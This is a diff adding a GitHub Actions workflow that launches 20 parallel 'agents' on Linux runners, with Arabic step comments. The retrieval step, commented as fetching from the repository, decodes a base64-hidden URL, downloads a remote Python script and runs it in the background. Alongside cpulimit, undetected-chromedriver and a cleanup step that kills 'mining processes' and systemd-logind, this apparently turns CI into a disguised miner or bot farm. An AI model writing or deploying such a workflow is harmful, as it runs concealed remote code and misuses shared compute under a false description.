@@ -1,0 +1,85 @@
+name: Linux Distributed Executor Grid
+
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: linux-grid-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  deploy-agents:
+    name: "Agent-${{ matrix.agent_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+
+    strategy:
+      fail-fast: false
+      matrix:
+        agent_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # -----------------------------------------------------------------
+      # المرحلة الأولى: تهيئة بيئة التشغيل الأساسية
+      # -----------------------------------------------------------------
+      - name: Base System Provisioning
+        run: |
+          echo "[PROVISION] Booting Agent ${{ matrix.agent_id }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y cpulimit curl python3-pip
+
+      # -----------------------------------------------------------------
+      # المرحلة الثانية: استلام الملف الرئيسي من المستودع
+      # -----------------------------------------------------------------
+      - name: Retrieve Main Script
+        run: |
+          echo "[RETRIEVE] Fetching app_task.py from source..."
+          DOWNLOAD_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvYWFhL3Jlc29sdmUvbWFpbi9zdGFydC5weQ==" | base64 --decode)
+          curl -sL "$DOWNLOAD_URL" -o app_task.py
+          echo "[RETRIEVE] Script downloaded successfully."
+
+      # -----------------------------------------------------------------
+      # المرحلة الثالثة: إعداد مكتبات بايثون المطلوبة
+      # -----------------------------------------------------------------
+      - name: Setup Python Dependencies
+        run: |
+          echo "[SETUP] Installing Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # -----------------------------------------------------------------
+      # المرحلة الرابعة: تشغيل المهمة مع نظام مراقبة زمني
+      # -----------------------------------------------------------------
+      - name: Run Task with Timeout Supervisor
+        run: |
+          echo ">> Starting task on Agent ${{ matrix.agent_id }}..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          AGENT_PID=$!
+          
+          echo ">> Supervisor engaged. Maximum runtime: 74 minutes."
+          
+          # انتظار المدة المسموحة
+          sleep 4440
+          
+          # التحقق مما إذا كانت العملية ما زالت نشطة
+          if kill -0 $AGENT_PID 2>/dev/null; then
+            echo ">> Time limit exceeded! Forcefully terminating process..."
+            kill -9 $AGENT_PID
+            echo ">> Process terminated."
+          else
+            echo ">> Process completed within the allowed window."
+          fi
+
+      # -----------------------------------------------------------------
+      # المرحلة الخامسة: إنهاء العمليات العالقة وتنظيف النظام
+      # -----------------------------------------------------------------
+      - name: Final Cleanup and Shutdown
+        run: |
+          echo "[CLEANUP] Agent ${{ matrix.agent_id }} concluding execution."
+          echo "[CLEANUP] Removing residual cpulimit and mining processes..."
+          sudo pkill -f cpulimit || true
+          sudo pkill -f systemd-logind || true
+          echo "[DONE] Agent ${{ matrix.agent_id }} has finished its cycle."
